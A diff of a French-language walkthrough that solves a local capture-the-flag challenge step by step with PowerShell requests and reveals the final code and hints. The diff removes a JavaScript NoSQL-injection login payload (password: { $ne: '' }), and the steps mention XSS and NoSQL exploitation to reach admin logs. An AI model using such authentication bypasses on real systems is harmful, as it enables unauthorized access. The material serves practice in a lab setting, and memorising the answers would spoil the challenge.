@@ -19,14 +19,12 @@ Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentT
 # 4) Logs admin (doit marcher après XSS+NoSQL)
 Invoke-RestMethod -Uri 'http://localhost:3000/auth/logs' -WebSession $session
 
-# 5) Billet + gateUrl
+# 5) Billet + QR (obligatoire)
 $ticket = Invoke-RestMethod -Uri 'http://localhost:3000/billets/my' -WebSession $session
 $ticket | Format-List
 
-# 6) Récupérer token depuis gateUrl puis lire l’énigme gate
-$token = ($ticket.gateUrl -split '/gate/')[1]
-$gate = Invoke-RestMethod -Uri ("http://localhost:3000/gate/" + $token) -WebSession $session
-$gate | Format-List
+# 6) Scanner le QR depuis billet.html avec un téléphone (étape obligatoire)
+# Le QR ouvre /gate/scan/<scanId> sur le téléphone ET declenche l'ouverture auto sur PC vers /gate/scan-result/<scanId>.
 
 # 7) Soumettre le code département final
 $flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
@@ -54,16 +52,6 @@ password = nimportequoi
 ```javascript
 fetch('/auth/login', {
   method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  credentials: 'include',
-  body: JSON.stringify({
-    username: 'alice',
-    password: { $ne: '' }
-  })
-})
-  .then(r => r.json())
-  .then(data => window.location.href = data.redirect);
-```
 
 7. Verifie les logs admin dans le navigateur :
 
@@ -71,8 +59,8 @@ fetch('/auth/login', {
 http://localhost:3000/auth/logs
 ```
 
-8. Ouvre http://localhost:3000/billet.html pour recuperer le billet et le gateUrl (via QR ou URL)
-9. Ouvre l'URL gate, tu obtiens message = RVN et hint = JN03EL
+8. Ouvre http://localhost:3000/billet.html pour recuperer le billet.
+9. Scan du QR obligatoire: le téléphone ouvre le JSON gate et le PC est redirige automatiquement vers le gate.
 10. IMPORTANT : la page gate JSON n'est pas le flag. Elle donne seulement l'indice final (code 94).
 11. Pour recuperer le flag en PowerShell, execute exactement :
 
